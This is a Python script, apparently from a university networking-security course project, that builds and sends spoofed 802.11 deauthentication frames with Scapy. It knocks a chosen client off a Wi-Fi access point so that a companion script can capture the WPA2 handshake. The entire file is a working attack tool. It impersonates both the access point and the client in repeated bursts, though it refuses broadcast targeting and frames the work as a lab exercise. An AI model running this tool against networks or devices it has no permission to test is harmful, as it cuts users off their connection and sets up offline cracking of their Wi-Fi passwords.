#!/usr/bin/env python3
"""
deauth.py  --  CSE 406 Project (Topic 20)  --  Group member: <NAME 1>

Sends 802.11 deauthentication frames to force ONE associated client off an
AP. When it reconnects it redoes the WPA2 4-way handshake -- which capture.py
records. We craft the frame ourselves (RadioTap/Dot11/Dot11Deauth); no aireplay.

Nothing is hardcoded now -- pass everything on the command line:
    sudo python3 deauth.py <iface> <AP_BSSID> <CLIENT_MAC> [count]
    sudo python3 deauth.py wlan0mon 5C:62:8B:BA:FD:3E 8A:29:12:5A:6E:D9 30

Get CLIENT_MAC from capture.py's "[client] ..." lines -- it is the device's
CURRENT (randomized) MAC on THIS bssid, which is what you must target. A stale
MAC, or a device that is actually on another radio of the same mesh, is the
usual reason nothing reconnects.

Why a specific client and not a broadcast "kick everyone": you only need ONE
client to reconnect to capture one handshake, so a targeted unicast deauth is
both sufficient and far more reliable -- modern clients often ignore broadcast
deauths outright, and the run you already succeeded with (aireplay -c <client>)
was itself targeted. A broadcast would just disrupt every device on the AP for
no extra benefit here.
"""

import sys
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

REASON = 7   # 802.11 reason 7 = class-3 frame from nonassociated STA


def build_deauth(dst, src, bssid):
    """One 802.11 deauth frame: addr1=receiver, addr2=sender, addr3=BSSID."""
    return (RadioTap() /
            Dot11(type=0, subtype=12, addr1=dst, addr2=src, addr3=bssid) /
            Dot11Deauth(reason=REASON))


def main():
    if not (4 <= len(sys.argv) <= 5):
        sys.exit(f"usage: sudo python3 {sys.argv[0]} "
                 f"<iface> <AP_BSSID> <CLIENT_MAC> [count]")
    iface  = sys.argv[1]
    ap     = sys.argv[2]
    client = sys.argv[3]
    count  = int(sys.argv[4]) if len(sys.argv) == 5 else 30

    if client.lower() == "ff:ff:ff:ff:ff:ff":
        sys.exit("[-] Refusing broadcast: target your own client's MAC. "
                 "One reconnect is all you need for the handshake, and "
                 "broadcast deauths are unreliable anyway.")

    # both directions: impersonate the AP to the client, and the client to AP
    to_client = build_deauth(dst=client, src=ap,     bssid=ap)
    to_ap     = build_deauth(dst=ap,     src=client, bssid=ap)

    print(f"[*] Deauthing {client} from {ap} on {iface} ({count} bursts)")
    print("[*] Keep capture.py running in another pane.")
    for i in range(count):
        sendp(to_client, iface=iface, count=1, verbose=False)
        sendp(to_ap,     iface=iface, count=1, verbose=False)
        print(f"    burst {i + 1}/{count} sent")
        time.sleep(0.1)
    print("[+] Done. Watch capture.py for '[+] EAPOL msg...' lines.")


if __name__ == "__main__":
    main()
